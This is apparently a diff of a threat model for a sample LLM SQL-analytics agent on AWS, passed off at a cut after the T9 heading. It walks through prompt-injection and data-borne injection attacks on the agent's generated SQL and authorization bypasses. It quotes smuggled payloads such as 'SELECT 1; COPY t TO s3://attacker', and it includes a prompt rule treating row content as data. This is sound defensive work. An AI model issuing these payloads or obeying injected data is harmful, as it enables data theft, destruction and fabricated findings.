 - **Targeting Specificity**: Targeted
 - **Relevant**: Yes
 - **Priority**: 4/10
-- **Description**: Operator misconfiguration as an unintentional threat: malformed GOVERNANCE_POLICIES, deploying without the inbound authorizer, or leaking the Cognito app client secret.
+- **Description**: Operator error as an unintentional threat: malformed GOVERNANCE_POLICIES, a policy that omits a mounted table, deploying without the JWT authorizer, or leaking the app client secret. Policy JSON is validated at import; omission now fails closed (deny-by-default).
 
-### Third Party
+### Compromised calling application (SigV4 path)
 
 - **Type**: Third Party
 - **Motivations**: Financial gain
@@ -261,7 +258,7 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **Targeting Specificity**: Opportunistic
 - **Relevant**: Yes
 - **Priority**: 3/10
-- **Description**: A compromised calling application on the SigV4 path (local/CLI), able to assert arbitrary tenant:role via the user-id header or payload identity — documented trust assumption, unused under the deployed JWT authorizer.
+- **Description**: A compromised/careless IAM-authenticated caller on the local/CLI SigV4 path able to assert arbitrary tenant:role via header/payload, OR to reuse a runtimeSessionId across identities. Documented trust assumption; unreachable under the deployed JWT authorizer, and the session-owner binding resets state on an identity change.
 
 ### Terrorist Organization
 
@@ -287,6 +284,32 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 - **Relevant**: No
 - **Description**: A commercial vendor developing zero-day exploits and spyware for client-selected targets
 
+### Data-borne prompt injector
+
+- **Type**: Other
+- **Motivations**: Financial gain, Disruption / destruction
+- **Resources**: Individual
+- **Relationship to Target**: External
+- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
+- **State Nexus**: None
+- **Targeting Specificity**: Opportunistic
+- **Relevant**: Yes
+- **Priority**: 6/10
+- **Description**: Cannot authenticate to the agent, but writes text an analyst's query will select: token names / contract data / log payloads on the public ledger, or attacker-influenceable CloudTrail fields. The text arrives in the model's context as a tool result and may steer the next turn. Governance still bounds data access; the risk is a fabricated narrative.
+
+### Compromised upstream supplier (supply chain)
+
+- **Type**: Third Party
+- **Motivations**: Espionage / intelligence collection, Financial gain
+- **Resources**: Organization
+- **Relationship to Target**: Partner / third-party
+- **Sophistication Tier**: Tier 4 - State-nexus / advanced
+- **State Nexus**: State-aligned
+- **Targeting Specificity**: Opportunistic
+- **Relevant**: Yes
+- **Priority**: 7/10
+- **Description**: Serves a malicious DuckDB extension build (installed at cold start unless pre-baked) or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore. Code inside the agent process bypasses every SQL-layer control. Low likelihood (signed extensions, HTTPS), high consequence.
+
 ## Trust Boundaries
 
 ### Trust Zones
@@ -295,51 +318,51 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 
 - **Trust Level**: Untrusted
 - **Architecture Nodes**: Streamlit chat UI (C001), Strands Agent + Bedrock Claude (C005)
-- **Description**: The Streamlit UI runs on the analyst's machine (holds ID token + app client secret in process env/memory); natural-language questions from end users AND the SQL the LLM generates from them. Prompt injection makes LLM output attacker-influenced.
+- **Description**: The Streamlit UI on the analyst's machine (holds the ID token + app client secret) and the LLM whose SQL output is attacker-influenceable via prompt injection and data-borne content.
 
 #### AWS managed platform
 
 - **Trust Level**: High
 - **Architecture Nodes**: Amazon Cognito user pool (C002), AgentCore Runtime + inbound JWT authorizer (managed) (C003), CloudWatch Logs (C009)
-- **Description**: Cognito user pool (token issuance), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock service, CloudWatch. AWS-operated; trusted per the shared-responsibility model.
+- **Description**: Cognito (token issuance, custom claims read-only on the client), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock, CloudWatch. AWS-operated; trusted per the shared-responsibility model.
 
 #### Agent process (sample code)
 
 - **Trust Level**: Medium
-- **Architecture Nodes**: Identity resolution (_resolve_claims) (C004), run_sql gate (single-statement + read-only) (C006), Governance rewrite (data_agent/governance/) (C007), DuckDB engine (in-process) (C008)
-- **Description**: The session's microVM process: identity resolution, single-statement read-only gate, governance rewrite, in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine.
+- **Architecture Nodes**: Scheduling / identity + session binding (C004), Statement pipeline: Gate -> Govern -> Cost -> Execute (C006), Governance rewrite (authorization) (C007), DuckDB engine (in-process) (C008)
+- **Description**: The session's microVM process: scheduling/session-binding, the statement pipeline, the governance rewrite, the in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine, rebound and reset on an owner change.
 
 #### Customer account data plane
 
 - **Trust Level**: High
 - **Architecture Nodes**: S3 analytical data (4 access paths) (D001), Label tables on S3 (OFAC + synthetic CEX) (D002), Secrets Manager (DuckLake PG credentials) (D003)
-- **Description**: S3 buckets/catalogs (analytical data + label tables), Secrets Manager entries in the customer's own account, reached only via the scoped read-only execution role.
+- **Description**: S3 buckets/catalogs (analytical data, exports, label tables) and Secrets Manager in the customer's own account, reached only via the scoped read-only execution role.
 
 ### Trust Boundaries
 
 #### Inbound AuthN edge (Cognito + managed authorizer)
 
 - **Type**: Network
-- **Controls**: Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH), AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience validation BEFORE agent code, requestHeaderAllowlist limits forwarded headers to Authorization, TLS on all calls
+- **Controls**: Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH), AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience, BEFORE agent code, requestHeaderAllowlist limits forwarded headers to Authorization, TLS on all calls
 - **Description**: The deployed sample's real authentication perimeter: only requests carrying a valid Cognito ID token for the configured audience reach a runtime session. Verified: no-token=401, forged-token=403, both pre-code.
 
 #### Platform -> agent identity handoff
 
 - **Type**: Virtual Machine
-- **Controls**: Managed authorizer verifies before agent code, claims normalization custom:tenant/custom:role -> tenant:role, trust-ordered fallback chain with default-role floor, unknown role in a known tenant -> tenant's MOST restricted policy (content-derived ranking, order-independent)
-- **Description**: Verified identity crosses from the managed authorizer into agent code as claims. AuthN happens platform-side; the sample only consumes verified claims. SigV4 fallback identity sources are caller-asserted (documented trust assumption, local/CLI path only).
+- **Controls**: Managed authorizer verifies before agent code, claims normalization custom:tenant/custom:role -> tenant:role, trust-ordered fallback chain with deny-all floor, unknown role -> tenant's MOST restricted policy, session-owner binding: state reset on an owner change (T003)
+- **Description**: Verified identity crosses from the managed authorizer into agent code as claims. The session is bound to its owner; a different identity on a reused session id resets the engine, results, history and counters.
 
-#### Untrusted SQL -> agent controls
+#### Untrusted model <-> agent controls
 
 - **Type**: Process
-- **Controls**: single-statement rule via duckdb.extract_statements (engine's own parser), leading-comment stripping before keyword classification, read-only statement allowlist (read + CREATE TEMP), governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE, explicit denied-column selection rejected with a legible policy error, raw table functions: AST-shape ALLOWLIST (Identifier sources only; pure generators excepted), fail-closed on unparseable SQL
-- **Description**: LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary of this model. All controls mutation-tested (code validation).
+- **Controls**: single-statement rule via duckdb.extract_statements, read-only statement allowlist + reserved-name check on the parsed tree, governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE, denied-column rejection, raw-path AST-shape allowlist, statement-root allowlist, local-name shadow refusal, TABLE-LEVEL DENY-BY-DEFAULT, cost gate: partition filter + bounded path expansion, fail-closed on any rewrite exception; every statement audited once, prompt rule: row content is data, not instructions
+- **Description**: The prompt goes to the model and the model's SQL comes back (attacker-influenceable via prompt injection AND data-borne content). THE central boundary of this model. All controls covered by 303 offline tests + a 19-check re-validation on the real code paths.
 
 #### Agent -> customer data plane
 
 - **Type**: Account
-- **Controls**: scoped read-only IAM execution role, READ_ONLY catalog attaches, TLS in transit, SSE + BlockPublicAccess + enforce_ssl on buckets, Secrets Manager for PG credentials
-- **Description**: Engine reads S3/catalog/label data with the scoped read-only execution role over TLS. Only governed SQL output flows back.
+- **Controls**: scoped read-only IAM execution role (source-bucket grant pinned to CUR + account-scoped CloudTrail prefixes), READ_ONLY catalog attaches, TLS in transit, SSE + BlockPublicAccess + enforce_ssl on buckets, aws:SourceArn on the CloudWatch Logs export bucket policy, Secrets Manager for PG credentials
+- **Description**: Engine reads S3/catalog/label/secret data with the scoped read-only execution role over TLS. Only governed SQL output flows back; the account pin is now an IAM boundary, not just a row filter.
 
 ## Assets and Flows
 
@@ -360,444 +383,560 @@ Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations
 | F001 | Cognito ID token (tenant/role claims) | Amazon Cognito user pool (C002) | Streamlit chat UI (C001) | HTTPS | Yes | N/A |
 | F002 | Cognito ID token (tenant/role claims) | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | Yes | N/A |
 | F003 | Cognito app client secret | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | Yes | N/A |
-| F004 | Agent-generated SQL (untrusted) | Strands Agent + Bedrock Claude (C005) | run_sql gate (single-statement + read-only) (C006) | N/A | Yes | 4 |
-| F005 | Agent-generated SQL (untrusted) | run_sql gate (single-statement + read-only) (C006) | Governance rewrite (data_agent/governance/) (C007) | N/A | Yes | 3 |
-| F006 | GOVERNANCE_POLICIES configuration | Governance rewrite (data_agent/governance/) (C007) | Governance rewrite (data_agent/governance/) (C007) | N/A | No | N/A |
-| F007 | Governed analytical rows/columns | S3 analytical data (4 access paths) (D001) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
-| F008 | Governed analytical rows/columns | Label tables on S3 (OFAC + synthetic CEX) (D002) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
-| F009 | Governed analytical rows/columns | DuckDB engine (in-process) (C008) | Streamlit chat UI (C001) | HTTPS | Yes | N/A |
+| F004 | Agent-generated SQL (untrusted) | Strands Agent + Bedrock Claude (C005) | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | N/A | Yes | 4 |
+| F005 | GOVERNANCE_POLICIES configuration | Scheduling / identity + session binding (C004) | Governance rewrite (authorization) (C007) | N/A | No | N/A |
+| F006 | Governed analytical rows/columns | S3 analytical data (4 access paths) (D001) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
+| F007 | Governed analytical rows/columns | DuckDB engine (in-process) (C008) | Streamlit chat UI (C001) | HTTPS | Yes | 3 |
 
 ## Threats
 
 ### Resolved Threats
 
-#### T1: Restricted end user (authenticated, low privilege)
+#### T1: Authenticated restricted analyst (any persona that is not deny-all)
 
-**Statement**: A Restricted end user (authenticated, low privilege) Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions can Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns, which leads to Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer
+**Statement**: A Authenticated restricted analyst (any persona that is not deny-all) A policy that governs at least one table, plus any OTHER table mounted by an enabled scenario that this policy does not name. Both shipped scenarios mounted together is the default configuration. can asks an ordinary question that reaches a mounted table the policy never mentions; the rewrite guarded only NAMED tables, so an unlisted one had no guard., which leads to the full contents of that table are returned. Was reproduced against the shipped defaults: ops:secops read cex_deposit_labels incl. subject_identity; ops:finops read CloudTrail source IPs; a junior
 
-- **Prerequisites**: Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions
-- **Action**: Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns
-- **Impact**: Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer
-- **Impacted Assets**: A001
-- **Tags**: prompt-injection, authz-bypass, core-threat
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: AST-level rewrite covers all four access paths; the completeness rules close the two bypasses found on 2026-09-03 - local names may not shadow a governed table (M018) and unmodellable statement shapes are rejected (M017) - so a governed name always denotes the governed table and no statement reaches the engine unrewritten. 49 adversarial regressions (nine shadowing shapes incl. recursive CTE, CTAS target and alias forms) plus per-persona cloud verification on the deployed runtime. Residual: novel sqlglot-vs-DuckDB semantic divergence, bounded by fail-closed parsing and a read-only worst case.
-- **Assessment State**: Current
-
-#### T2: Restricted end user via LLM prompt injection
-
-**Statement**: A Restricted end user via LLM prompt injection Same as above; knowledge that an embedded engine executes generated SQL can Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified, which leads to Ungoverned statement reaches the engine - RLS/CLS bypass
-
-- **Prerequisites**: Same as above; knowledge that an embedded engine executes generated SQL
-- **Action**: Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified
-- **Impact**: Ungoverned statement reaches the engine - RLS/CLS bypass
-- **Impacted Assets**: A001
-- **Tags**: parser-divergence, fail-closed
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Unparseable SQL is rejected for restricted principals, and SQL that parses only as an opaque Command is now rejected too (M017) - previously the fail-closed claim covered parse FAILURE but not parse DEGRADATION, which was the live bypass. A statement would need to parse cleanly into a governable root in sqlglot AND mean something different to DuckDB; worst case is still read-only within the session.
-- **Assessment State**: Current
-
-#### T3: Restricted end user via LLM prompt injection
-
-**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; gate classifies on the leading keyword can Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement, which leads to Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate
-
-- **Prerequisites**: Valid restricted session; gate classifies on the leading keyword
-- **Action**: Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement
-- **Impact**: Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate
-- **Impacted Assets**: A001, A005
-- **Tags**: multi-statement, write-gate, phase-7.5-fix
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Single-statement rule uses the engine's own parser (no lexer divergence to aim at); mutation-verified; end-to-end test proves the second statement never reaches the engine. Layers 2-3 (READ_ONLY attaches, no write IAM) still bound any residual.
-- **Assessment State**: Current
-
-#### T4: Restricted end user via LLM prompt injection
-
-**Statement**: A Restricted end user via LLM prompt injection Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release can Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every, which leads to Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass
-
-- **Prerequisites**: Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release
-- **Action**: Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every
-- **Impact**: Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass
-- **Impacted Assets**: A001
-- **Tags**: raw-path, allowlist, phase-7.5-fix
-- **Residual Risk Decision**: Mitigated
-- **Residual Severity**: Low
-- **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Posture inverted to an AST-shape allowlist: new DuckDB file functions are rejected by default rather than slipping past a stale name list. Additions to the generator exception list require explicit justification. Cloud-verified rejection.
-- **Assessment State**: Current
-
-#### T5: Restricted end user presenting an unknown role
-
-**Statement**: A Restricted end user presenting an unknown role Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies can Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical, which leads to Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed
-
-- **Prerequisites**: Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies
-- **Action**: Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical
-- **Impact**: Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed
+- **Prerequisites**: A policy that governs at least one table, plus any OTHER table mounted by an enabled scenario that this policy does not name. Both shipped scenarios mounted together is the default configuration.
+- **Action**: asks an ordinary question that reaches a mounted table the policy never mentions; the rewrite guarded only NAMED tables, so an unlisted one had no guard.
+- **Impact**: the full contents of that table are returned. Was reproduced against the shipped defaults: ops:secops read cex_deposit_labels incl. subject_identity; ops:finops read CloudTrail source IPs; a junior
 - **Impacted Assets**: A001, A004
-- **Tags**: role-fallback, order-dependence, phase-7.5-fix
+- **Tags**: governance-completeness, table-level-default-allow, fixed
 - **Residual Risk Decision**: Mitigated
 - **Residual Severity**: Low
 - **Residual Likelihood**: Unlikely
-- **Residual Risk Rationale**: Fallback is content-derived and declaration-order independent; tested with the two-policy tenant shape that exposed the original bug. Residual: an operator could still author a 'most restricted' policy that is broader than intended - covered by T011.
+- **Residual Risk Rationale**: Table-level deny-by-default refuses any mounted-but-unlisted table for restricted principals across all four access paths; personas list their readable tables; L0/search are role-filtered. Verified live (verify3) and by 303 offline tests. Residual: a semantically over-broad policy an operator authors is T011.
 - **Assessment State**: Current
 
-#### T6: External attacker at the runtime endpoint
+#### T2: Authenticated restricted analyst with any ops persona
 
-**Statement**: A External attacker at the runtime endpoint Network reach to the public AgentCore runtime endpoint; no valid Cognito token can Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client, which leads to Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn
+**Statement**: A Authenticated restricted analyst with any ops persona The cloud-ops scenario deployed with the CloudWatch Logs export of the runtime's own log group curated into the cw_logs table (the documented setup). can queries cw_logs, whose rows are the agent's own EMF audit lines., which leads to reconstructs other principals' activity: their role, their verbatim SQL (with the addresses/account ids they investigated), and the RLS/CLS applied to them.
 
-- **Prerequisites**: Network reach to the public AgentCore runtime endpoint; no valid Cognito token
-- **Action**: Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client
-- **Impact**: Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn
-- **Impacted Assets**: A002
-- **Tags**: authn, jwt, cognito
+- **Prerequisites**: The cloud-ops scenario deployed with the CloudWatch Logs export of the runtime's own log group curated into the cw_logs table (the documented setup).
+- **Action**: queries cw_logs, whose rows are the agent's own EMF audit lines.
+- **Impact**: reconstructs other principals' activity: their role, their verbatim SQL (with the addresses/account ids they investigated), and the RLS/CLS applied to them.
+- **Impacted Assets**: A004
+- **Tags**: audit-as-data, fixed
 - **Residual Risk Decision**: Mitigated
 - **Residual Severity**: Low
-- **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Platform-enforced pre-code validation (401/403 verified live). Residual: stolen VALID tokens are T008; the platform's authorizer is AWS-managed and out of sample scope.
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: cw_logs is named by no persona, so it is unreadable except to the unrestricted operator role, and documented as part of the governance boundary. Follows from deny-by-default.
 - **Assessment State**: Current
 
-#### T7: Malicious or compromised calling application (SigV4 path)
+#### T3: Malicious client, careless integrator, or the SigV4 calling application
 
-**Statement**: A Malicious or compromised calling application (SigV4 path) IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity can Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy, which leads to Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source
+**Statement**: A Malicious client, careless integrator, or the SigV4 calling application Two identities presenting the SAME runtimeSessionId (an integrator deriving session ids from something predictable, a reused id, or a leaked one). AgentCore isolates by session id. can invokes with another principal's session id; the engine, result store, conversation history and audit counters are module-level and lived for the microVM, and nothing re-bound or reset them., which leads to a lower-privileged principal reads governed OUTPUT produced under a higher-privileged policy, plus the prior conversation. Reproduced: a junior counted an admin-materialized _r_1 in full.
 
-- **Prerequisites**: IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity
-- **Action**: Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy
-- **Impact**: Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source
-- **Impacted Assets**: A002
-- **Tags**: identity-assertion, trust-assumption
-- **Residual Risk Decision**: Accepted
-- **Residual Severity**: Medium
-- **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert its users' identity (standard service-to-service identity propagation). The deployed path uses the JWT authorizer, where these fallback sources are unreachable because the authorizer rejects unauthenticated requests pre-code.
+- **Prerequisites**: Two identities presenting the SAME runtimeSessionId (an integrator deriving session ids from something predictable, a reused id, or a leaked one). AgentCore isolates by session id.
+- **Action**: invokes with another principal's session id; the engine, result store, conversation history and audit counters are module-level and lived for the microVM, and nothing re-bound or reset them.
+- **Impact**: a lower-privileged principal reads governed OUTPUT produced under a higher-privileged policy, plus the prior conversation. Reproduced: a junior counted an admin-materialized _r_1 in full.
+- **Impacted Assets**: A001, A005
+- **Tags**: session-binding, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: The session is bound to its owner and all retained state is reset on an owner change; verified a junior cannot read an admin-materialized result after the rebind. Residual rests on AgentCore's per-session microVM isolation.
 - **Assessment State**: Current
 
-#### T8: Attacker with access to the analyst's machine or environment
+#### T4: Authenticated restricted analyst, or the model on an ordinary question
 
-**Statement**: A Attacker with access to the analyst's machine or environment The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password can Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to, which leads to Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity
+**Statement**: A Authenticated restricted analyst, or the model on an ordinary question A raw partitioned source and a literal partition predicate that spans more than MAX_EXPANDED_PARTITIONS (366), or an unsatisfiable range. can asks for a range like WHERE date BETWEEN '2015-08-01' AND '2026-09-01'; the cost gate recorded the filter as satisfied, then declined to expand because the range exceeded the cap., which leads to the engine LISTs and scans the entire S3 prefix — exactly the cost the gate exists to prevent — for terabytes of history. Reproduced: an 11-year BETWEEN yielded expanded_paths=0 and an unchanged
 
-- **Prerequisites**: The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password
-- **Action**: Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to
-- **Impact**: Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity
-- **Impacted Assets**: A002, A003
-- **Tags**: ui, token-theft, default-credentials
-- **Residual Risk Decision**: Accepted
-- **Residual Severity**: Medium
-- **Residual Likelihood**: Possible
-- **Residual Risk Rationale**: Bearer-token theft is inherent to token auth; lifetime bounds exposure. The app client can no longer write custom:tenant/custom:role, so a stolen session cannot be escalated beyond the victim's own role (M020, T018). Demo credentials remain rotate-before-exposing (operator responsibility) and MFA is deliberately OFF for demo convenience - production guidance: short token TTLs, MFA on the pool, restricted app client. Analyst-host security is out of scope for a sample.
-- **Assessment State**: Current
-
-#### T9: Restricted end user
-
-**Statement**: A Restricted end user Valid restricted session; CLS policy denies a column (subject_identity) can Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing, which leads to Partial disclosure of denied-column information without direct selection
-
-- **Prerequisites**: Valid restricted session; CLS policy denies a column (subject_identity)
-- **Action**: Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing
-- **Impact**: Partial disclosure of denied-column information without direct selection
+- **Prerequisites**: A raw partitioned source and a literal partition predicate that spans more than MAX_EXPANDED_PARTITIONS (366), or an unsatisfiable range.
+- **Action**: asks for a range like WHERE date BETWEEN '2015-08-01' AND '2026-09-01'; the cost gate recorded the filter as satisfied, then declined to expand because the range exceeded the cap.
+- **Impact**: the engine LISTs and scans the entire S3 prefix — exactly the cost the gate exists to prevent — for terabytes of history. Reproduced: an 11-year BETWEEN yielded expanded_paths=0 and an unchanged
 - **Impacted Assets**: A001
-- **Tags**: side-channel, inference
+- **Tags**: cost-gate, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: Wide (>cap) and unsatisfiable literal ranges are refused before the engine; non-literal predicates still pass to engine pruning. Worst case is read-only and bounded; verified by unit tests + verify3.
+- **Assessment State**: Current
+
+#### T5: Authenticated analyst via the model, or data-borne prompt injection
+
+**Statement**: A Authenticated analyst via the model, or data-borne prompt injection Knowledge that framework results live in temp tables named _r_<n> (stated in the system prompt and every summary result). can issues CREATE OR REPLACE TEMP TABLE "_r_1" AS SELECT ...; the reserved-name check was a regex over the statement text that matched only the UNQUOTED form, so a quoted identifier passed., which leads to the framework's own result table is replaced by attacker-chosen rows; the model then reports fabricated figures as the real answer, invisibly in an investigation.
+
+- **Prerequisites**: Knowledge that framework results live in temp tables named _r_<n> (stated in the system prompt and every summary result).
+- **Action**: issues CREATE OR REPLACE TEMP TABLE "_r_1" AS SELECT ...; the reserved-name check was a regex over the statement text that matched only the UNQUOTED form, so a quoted identifier passed.
+- **Impact**: the framework's own result table is replaced by attacker-chosen rows; the model then reports fabricated figures as the real answer, invisibly in an investigation.
+- **Impacted Assets**: A005
+- **Tags**: reserved-names, result-integrity, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: Reserved-name detection is on the parsed tree, catching quoted and column-alias forms; integrity-only, confined to the attacker's own session. Verified end to end.
+- **Assessment State**: Current
+
+#### T6: Authenticated restricted analyst
+
+**Statement**: A Authenticated restricted analyst SQL whose table alias breaks the re-parse of the guard subquery the rewrite builds; an alias of `a)` is sufficient. can submits it; the rewrite raised a sqlglot ParseError, which is not a ValueError, so the Govern stage's handler did not catch it and the driver never reached its audit., which leads to the statement attempt left NO audit record and surfaced as an unhandled framework error instead of a clean rejection. Reproduced: zero audit records and a ParseError out of the pipeline.
+
+- **Prerequisites**: SQL whose table alias breaks the re-parse of the guard subquery the rewrite builds; an alias of `a)` is sufficient.
+- **Action**: submits it; the rewrite raised a sqlglot ParseError, which is not a ValueError, so the Govern stage's handler did not catch it and the driver never reached its audit.
+- **Impact**: the statement attempt left NO audit record and surfaced as an unhandled framework error instead of a clean rejection. Reproduced: zero audit records and a ParseError out of the pipeline.
+- **Impacted Assets**: A004
+- **Tags**: audit-coverage, error-handling, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: The guard alias is AST-attached; Govern and the driver fail closed on any exception; every statement is audited exactly once. Accountability defect closed; data was never exposed.
+- **Assessment State**: Current
+
+#### T7: Unrestricted ops:admin persona (or any principal allowed raw paths)
+
+**Statement**: A Unrestricted ops:admin persona (or any principal allowed raw paths) The stack deployed with -c opsSourceBuckets, which granted s3:GetObject/ListBucket on the WHOLE named CUR and CloudTrail buckets, while the account scope was only a SQL row filter. can reads a path outside the pinned account, e.g. read_json over AWSLogs/<other-account>/CloudTrail/, since the unrestricted role may reference raw paths., which leads to CloudTrail of other accounts in the organization is readable through the agent — the account pin was not an IAM boundary.
+
+- **Prerequisites**: The stack deployed with -c opsSourceBuckets, which granted s3:GetObject/ListBucket on the WHOLE named CUR and CloudTrail buckets, while the account scope was only a SQL row filter.
+- **Action**: reads a path outside the pinned account, e.g. read_json over AWSLogs/<other-account>/CloudTrail/, since the unrestricted role may reference raw paths.
+- **Impact**: CloudTrail of other accounts in the organization is readable through the agent — the account pin was not an IAM boundary.
+- **Impacted Assets**: A001
+- **Tags**: iac, least-privilege, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: The source-bucket grant is pinned to the CUR prefix and the account-scoped CloudTrail prefix, with ListBucket restricted by s3:prefix; the account pin is now an IAM boundary. Requires the unrestricted persona to matter at all.
+- **Assessment State**: Current
+
+#### T8: Another workload or principal inside the same AWS account
+
+**Statement**: A Another workload or principal inside the same AWS account The solution bucket policy granted the CloudWatch Logs service principal PutObject under ops/cwlogs-export/ with only an aws:SourceAccount condition. can creates a CloudWatch Logs export task from an unrelated log group targeting that same prefix., which leads to unrelated log content lands in the prefix the loader curates into cw_logs, polluting the agent's audit history. AWS documents SourceAccount together with SourceArn.
+
+- **Prerequisites**: The solution bucket policy granted the CloudWatch Logs service principal PutObject under ops/cwlogs-export/ with only an aws:SourceAccount condition.
+- **Action**: creates a CloudWatch Logs export task from an unrelated log group targeting that same prefix.
+- **Impact**: unrelated log content lands in the prefix the loader curates into cw_logs, polluting the agent's audit history. AWS documents SourceAccount together with SourceArn.
+- **Impacted Assets**: A004
+- **Tags**: iac, confused-deputy, fixed
+- **Residual Risk Decision**: Mitigated
+- **Residual Severity**: Low
+- **Residual Likelihood**: Unlikely
+- **Residual Risk Rationale**: aws:SourceArn pins the CloudWatch Logs export condition to the runtime's own log group; cross-account was already blocked by SourceAccount.
+- **Assessment State**: Current
+
+#### T9: Data-borne prompt injector who cannot authenticate to the agent
+
